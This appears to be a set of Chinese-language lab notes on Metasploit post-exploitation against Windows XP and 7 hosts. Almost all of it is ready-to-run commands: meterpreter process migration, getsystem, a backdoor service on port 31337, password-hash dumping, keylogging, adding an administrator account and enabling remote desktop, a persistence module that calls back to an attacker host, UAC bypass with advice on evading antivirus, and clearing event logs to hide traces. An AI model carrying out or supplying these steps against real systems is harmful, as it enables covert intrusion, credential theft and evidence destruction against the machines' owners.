# kali-msf后渗透与持久化


## 持久化，后渗透
* 上述步骤得到session后，如果目标exe关闭了，会导致会话丢失，所以要注入到一个运行时间更久的程序中
```
meterpreter > run migrate -n explorer.exe
```
* run checkvm 检测是否是虚拟机
* background 当前会话退到后台
* download 下载目标机的文件
* upload 上传文件到目标机
* getsystem 尝试获取system用户权限
* getuid 获取当前用户的权限信息
* shell 进入windows shell交互模式
* ps 查看目标机所有进程信息
* execute -H -f xxx.exe
* run metsvc 以系统服务形式安装:在目标主机的31337端口开启监听,使用metsvc.exe安装metsvc-server.exe服务,运行时加载metsrv.dll
* run windows/gather/smart_hashdump  dump用户口令hash
* 键盘记录器功能keyscan
```
命令：
keyscan_start   开启记录目标主机的键盘输入
keyscan_dump   输出截获到的目标键盘输入字符信息
keyscan_stop     停止键盘记录
```

### 增加windows 用户
```
net user test test /add  #用户名、密码都是test
net user test #查看test用户的信息
net localgroup administrators test /add #添加为管理员组
reg add HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f  #xp,2003直接开启3389，不用重启，如果xp用户正在登陆中，登陆3389用户那边会弹窗
```
* 注：使用meterpreter只需要下面的命令
```
>run  getgui  -e   //开启目标主机远程桌面
>run getgui -u test -p test //添加远程用户
```

### xp实验顺序
```
meterpreter > run migrate -n explorer.exe
>getsystem
>getuid
>run metsvc //安装服务,安装的服务如何使用，见下文
>run  getgui  -e   //开启目标主机远程桌面
>run getgui -u test -p test //添加远程用户
#rdesktop  -u  test  -p  test  192.168.10.128:3389 //使用kali的命令连接远程桌面
>clearev  ///清除日志

>run multi_console_command -r /root/.msf4/logs/scripts/getgui/clean_up__xxx.rc #清除痕迹,关闭服务,删除添加账号，如果有必要
```


从armitage中学来的,持久化攻击
```
msf> use exploit/windows/local/persistence
>set TARGET 0 #0表示windows
>set LHOST 192.168.10.131
>set LPORT 23198
>set SESSION 1
>set ExitOnSession false
>set STARTUP SYSTEM
>set DELAY 10
>set DisablePayloadHandler true
>exploit -j    #-j表示runing as background job
```
测试中，只要armitage没有关闭，不论重启多少次，都会建立session

### win7实验顺序
```
meterpreter > run migrate -n explorer.exe
>run metsvc -A//安装服务,普通用户可以安装成功，安装的服务如何使用，TODO
>getsystem //提示失败了，咋办？使用local exploit提权
>getuid
>run  getgui  -e   //开启目标主机远程桌面
>run getgui -u test -p test //添加远程用户,此时3389端口还没通，需要system用户
#rdesktop  -u  test  -p  test  192.168.10.128:3389 //使用kali的命令连接远程桌面
>clearev  ///清除日志

>run multi_console_command -r /root/.msf4/logs/scripts/getgui/clean_up__xxx.rc #清除痕迹,关闭服务,删除添加账号，如果有必要

```

### win7 本地提权
在已有的会话中
```
>background
msf>use exploit/windows/local/bypassuac
>set SESSION 1
>show options //确认所有项目都配置好了
>run
//成功后，会返回新的会话
>getuid
>getsystem 即可成功
```
* 提权后建立账号、远程桌面等

使用bypassuac模块时一些注意事项：

使用bypassuac模块进行提权时，系统当前用户必须在管理员组，而且用户账户控制程序UAC设置为默认，即“仅在程序试图更改我的计算机时通知我”。
Bypassuac模块运行时会在目标机上创建多个文件，会被杀毒软件识别。exploit/windows/local/bypassuac_injection模块直接运行在内存中的反射DLL中，所以它不触碰硬盘，可以最大限度地降低被杀毒软件检测到的概率。
Metasploit框架攻击目前没有针对Windows 8的模块

## 键盘记录

```
msf> use post/windows/capture/keylog_recorder
>set INTERVAL 5
>set LOCKSCREEN false
>set CAPTURE_TYPE explorer
>set SESSION 4  #根据实际情况调整
>set MIGRATE true
>set ShowKeystrokes true
>run -j
```

## 使用armitage
1. 添加hosts
2. scan
3. find attack  #注：这个并不是百分百靠谱
4. attack
5. 得到session